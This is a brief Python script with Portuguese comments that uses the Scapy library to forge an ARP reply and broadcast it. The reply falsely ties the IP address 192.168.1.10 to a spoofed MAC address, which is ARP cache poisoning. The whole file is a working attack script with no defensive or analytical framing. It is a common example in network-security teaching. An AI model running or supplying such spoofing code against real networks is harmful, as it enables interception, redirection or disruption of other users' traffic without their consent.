#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp

# Construindo um pacote ARP falsificado (spoofing)
# op=2 indica ARP reply
# psrc: IP que está sendo "spoofado"
# hwsrc: MAC do remetente (spoofed)
# pdst: IP do destino (quem deve receber a resposta)
# hwdst: MAC do destino
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2,
    psrc="192.168.1.10",    # IP que está sendo "spoofado"
    hwsrc="66:55:44:33:22:11",  # MAC spoofed
    pdst="192.168.1.20",    # IP de destino
    hwdst="00:11:22:33:44:55"   # MAC do destinatário
)

# Envia o pacote utilizando sendp() (para pacotes de camada 2)
sendp(packet, verbose=0)
print("Pacote ARP enviado com sucesso!")

